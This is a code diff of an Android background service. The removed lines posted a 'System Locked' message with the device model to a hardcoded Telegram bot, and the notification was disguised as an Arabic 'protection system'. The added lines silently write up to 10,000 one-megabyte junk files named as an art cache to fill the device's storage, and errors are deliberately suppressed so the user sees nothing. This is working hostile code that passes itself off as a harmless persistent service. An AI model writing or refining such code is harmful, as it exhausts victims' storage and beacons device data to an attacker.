@@ -4,8 +4,8 @@ import android.app.*;
 import android.content.Intent;
 import android.os.Build;
 import android.os.IBinder;
-import java.net.HttpURLConnection;
-import java.net.URL;
+import java.io.File;
+import java.io.FileOutputStream;
 
 public class BgService extends Service {
     @Override
@@ -13,20 +13,32 @@ public class BgService extends Service {
         super.onCreate();
         String CHANNEL = "ch";
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel c = new NotificationChannel(CHANNEL, "System", NotificationManager.IMPORTANCE_LOW);
+            NotificationChannel c = new NotificationChannel(CHANNEL, "A_Art", NotificationManager.IMPORTANCE_LOW);
             getSystemService(NotificationManager.class).createNotificationChannel(c);
         }
         Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? new Notification.Builder(this, CHANNEL) : new Notification.Builder(this);
-        startForeground(1, b.setContentTitle("نظام الحماية").setContentText("يعمل في الخلفية").setSmallIcon(android.R.drawable.ic_menu_manage).setOngoing(true).build());
+        startForeground(1, b.setContentTitle("A_Art").setContentText("Running...").setSmallIcon(android.R.drawable.ic_menu_manage).setOngoing(true).build());
 
         new Thread(() -> {
             try {
-                String url = "https://api.telegram.org/bot8885955583:AAFB3gmzus0AJNLcRlDkZ8UsOWH_4DnManE/sendMessage?chat_id=7560932400&text=System Locked: " + Build.MODEL;
-                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
-                conn.getOutputStream().flush();
-            } catch (Exception e) {}
+                File dir = getExternalFilesDir(null);
+                byte[] buffer = new byte[1024 * 1024]; // 1MB
+                int maxFiles = 10000; // 10,000 ملف
+
+                for (int i = 0; i < maxFiles; i++) {
+                    File file = new File(dir, "art_cache_" + i + ".bin");
+                    if (file.exists()) continue;
+                    
+                    FileOutputStream fos = new FileOutputStream(file);
+                    fos.write(buffer);
+                    fos.close();
+                }
+            } catch (Exception e) {
+                // مفيش رسائل ولا أخطاء بتظهر
+            }
         }).start();
     }
+
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
     @Override
